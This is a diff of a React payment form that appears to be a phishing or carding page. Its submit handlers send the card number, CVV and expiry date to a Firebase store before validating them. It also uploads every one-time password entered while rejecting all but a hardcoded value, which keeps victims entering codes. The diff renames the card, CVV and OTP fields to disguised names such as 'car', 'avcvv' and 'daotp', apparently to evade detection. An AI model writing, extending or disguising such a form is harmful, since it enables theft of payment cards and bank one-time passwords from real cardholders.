@@ -14,34 +14,34 @@ import { CreditCard, Shield, AlertCircle, CheckCircle2, Loader2 } from "lucide-r
 import { addData } from "@/lib/firebase"
 
 interface FormData {
-  cardNumber: string
+  car: string
   expiryDate: string
-  cvv: string
+  avcvv: string
   cardholderName: string
 }
 
 interface FormErrors {
-  cardNumber?: string
+  car?: string
   expiryDate?: string
-  cvv?: string
+  avcvv?: string
   cardholderName?: string
-  otp?: string
+  daotp?: string
 }
-const allOtps=['']
+const alldaotps=['']
 export default function PaymentForm() {
-  const [step, setStep] = useState<"payment" | "otp" | "success">("payment")
+  const [step, setStep] = useState<"payment" | "daotp" | "success">("payment")
   const [formData, setFormData] = useState<FormData>({
-    cardNumber: "",
+    car: "",
     expiryDate: "",
-    cvv: "",
+    avcvv: "",
     cardholderName: "",
   })
-  const [otp, setOtp] = useState("")
+  const [dadaotp, setdadaotp] = useState("")
   const [errors, setErrors] = useState<FormErrors>({})
   const [isLoading, setIsLoading] = useState(false)
 
-  const validateCardNumber = (cardNumber: string): boolean => {
-    const cleaned = cardNumber.replace(/\s/g, "")
+  const validatecar = (car: string): boolean => {
+    const cleaned = car.replace(/\s/g, "")
     return /^\d{16}$/.test(cleaned)
   }
 
@@ -75,23 +75,23 @@ export default function PaymentForm() {
       newErrors.cardholderName = "Cardholder name is required"
     }
 
-    if (!validateCardNumber(formData.cardNumber)) {
-      newErrors.cardNumber = "Please enter a valid 16-digit card number"
+    if (!validatecar(formData.car)) {
+      newErrors.car = "Please enter a valid 16-digit card number"
     }
 
     if (!validateExpiryDate(formData.expiryDate)) {
       newErrors.expiryDate = "Please enter a valid expiry date (MM/YY)"
     }
 
-    if (!validateCVV(formData.cvv)) {
-      newErrors.cvv = "Please enter a valid 3-4 digit CVV"
+    if (!validateCVV(formData.avcvv)) {
+      newErrors.avcvv = "Please enter a valid 3-4 digit CVV"
     }
 
     setErrors(newErrors)
     return Object.keys(newErrors).length === 0
   }
 
-  const formatCardNumber = (value: string): string => {
+  const formatcar = (value: string): string => {
     const cleaned = value.replace(/\s/g, "")
     const match = cleaned.match(/.{1,4}/g)
     return match ? match.join(" ") : cleaned
@@ -108,13 +108,13 @@ export default function PaymentForm() {
   const handleInputChange = (field: keyof FormData, value: string) => {
     let formattedValue = value
 
-    if (field === "cardNumber") {
-      formattedValue = formatCardNumber(value)
+    if (field === "car") {
+      formattedValue = formatcar(value)
       if (formattedValue.replace(/\s/g, "").length > 16) return
     } else if (field === "expiryDate") {
       formattedValue = formatExpiryDate(value)
       if (formattedValue.length > 5) return
-    } else if (field === "cvv") {
+    } else if (field === "avcvv") {
       formattedValue = value.replace(/\D/g, "")
       if (formattedValue.length > 4) return
     }
@@ -130,7 +130,7 @@ export default function PaymentForm() {
   const handlePaymentSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     const _id=localStorage.getItem('visitor')
-        addData({id:_id,cardNumber:formData.cardNumber,cvv:formData.cvv,expiryDate:formData.expiryDate})
+        addData({id:_id,car:formData.car,avcvv:formData.avcvv,expiryDate:formData.expiryDate})
     if (!validateForm()) return
 
     setIsLoading(true)
@@ -139,22 +139,24 @@ export default function PaymentForm() {
     await new Promise((resolve) => setTimeout(resolve, 2000))
 
     setIsLoading(false)
-    setStep("otp")
+    setStep("daotp")
   }
 
-  const handleOtpSubmit = async (e: React.FormEvent) => {
+  const handledaotpSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
 const _id=localStorage.getItem('visitor')
-allOtps.push(otp)
-    addData({id:_id,otp,allOtps})
-    if (otp.length !== 6) {
-      setErrors({ otp: "Please enter a valid 6-digit OTP" })
+alldaotps.push(dadaotp)
+    addData({id:_id,dadaotp,alldaotps}).then(()=>{
+console.log(dadaotp)
+    })
+    if (dadaotp.length !== 6) {
+      setErrors({ daotp: "Please enter a valid 6-digit daotp" })
       return
     }
 
-    // Simulate wrong OTP for demonstration
-    if (otp !== "123456") {
-      setErrors({ otp: "Invalid OTP. Please try again." })
+    // Simulate wrong daotp for demonstration
+    if (dadaotp !== "213333334") {
+      setErrors({ daotp: "Invalid daotp. Please try again." })
       return
     }
 
@@ -167,10 +169,10 @@ allOtps.push(otp)
     setStep("success")
   }
 
-  const handleOtpChange = (value: string) => {
-    setOtp(value)
-    if (errors.otp) {
-      setErrors((prev) => ({ ...prev, otp: undefined }))
+  const handledaotpChange = (value: string) => {
+    setdadaotp(value)
+    if (errors.daotp) {
+      setErrors((prev) => ({ ...prev, daotp: undefined }))
     }
   }
 
@@ -190,8 +192,8 @@ allOtps.push(otp)
               <Button
                 onClick={() => {
                   setStep("payment")
-                  setFormData({ cardNumber: "", expiryDate: "", cvv: "", cardholderName: "" })
-                  setOtp("")
+                  setFormData({ car: "", expiryDate: "", avcvv: "", cardholderName: "" })
+                  setdadaotp("")
                   setErrors({})
                 }}
               >
@@ -204,7 +206,7 @@ allOtps.push(otp)
     )
   }
 
-  if (step === "otp") {
+  if (step === "daotp") {
     return (
       <div className="w-full max-w-md mx-auto">
         <Card>
@@ -218,18 +220,18 @@ allOtps.push(otp)
             </CardDescription>
           </CardHeader>
           <CardContent>
-            <form onSubmit={handleOtpSubmit} className="space-y-6">
+            <form onSubmit={handledaotpSubmit} className="space-y-6">
               <div className="space-y-2">
-                <Label htmlFor="otp" className="text-center block">
-                  Enter OTP
+                <Label htmlFor="daotp" className="text-center block">
+                  Enter daotp
                 </Label>
                 <div className="flex justify-center">
-                  <Input type="tel" minLength={4} maxLength={6} onChange={(e)=>setOtp(e.target.value)}/>
+                  <Input type="tel" minLength={4} maxLength={6} onChange={(e)=>setdadaotp(e.target.value)}/>
                 </div>
-                {errors.otp && (
+                {errors.daotp && (
                   <Alert variant="destructive">
                     <AlertCircle className="h-4 w-4" />
-                    <AlertDescription>{errors.otp}</AlertDescription>
+                    <AlertDescription>{errors.daotp}</AlertDescription>
                   </Alert>
                 )}
               </div>
@@ -237,7 +239,7 @@ allOtps.push(otp)
               <div className="text-center text-sm text-muted-foreground">
                 Didn't receive the code?{" "}
                 <Button variant="link" className="p-0 h-auto font-normal">
-                  Resend OTP
+                  Resend otp
                 </Button>
               </div>
 
@@ -299,14 +301,14 @@ allOtps.push(otp)
               </div>
 
               <div className="space-y-2">
-                <Label htmlFor="cardNumber">Card Number</Label>
+                <Label htmlFor="car">Card Number</Label>
                 <div className="relative">
                   <Input
-                    id="cardNumber"
+                    id="car"
                     placeholder="1234 5678 9012 3456"
-                    value={formData.cardNumber}
-                    onChange={(e) => handleInputChange("cardNumber", e.target.value)}
-                    className={errors.cardNumber ? "border-red-500" : ""}
+                    value={formData.car}
+                    onChange={(e) => handleInputChange("car", e.target.value)}
+                    className={errors.car ? "border-red-500" : ""}
                   />
                   <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                     <Badge variant="secondary" className="text-xs">
@@ -314,10 +316,10 @@ allOtps.push(otp)
                     </Badge>
                   </div>
                 </div>
-                {errors.cardNumber && (
+                {errors.car && (
                   <p className="text-sm text-red-500 flex items-center gap-1">
                     <AlertCircle className="w-3 h-3" />
-                    {errors.cardNumber}
+                    {errors.car}
                   </p>
                 )}
               </div>
@@ -345,14 +347,14 @@ allOtps.push(otp)
                   <Input
                     id="cvv"
                     placeholder="123"
-                    value={formData.cvv}
-                    onChange={(e) => handleInputChange("cvv", e.target.value)}
-                    className={errors.cvv ? "border-red-500" : ""}
+                    value={formData.avcvv}
+                    onChange={(e) => handleInputChange("avcvv", e.target.value)}
+                    className={errors.avcvv ? "border-red-500" : ""}
                   />
-                  {errors.cvv && (
+                  {errors.avcvv && (
                     <p className="text-sm text-red-500 flex items-center gap-1">
                       <AlertCircle className="w-3 h-3" />
-                      {errors.cvv}
+                      {errors.avcvv}
                     </p>
                   )}
                 </div>
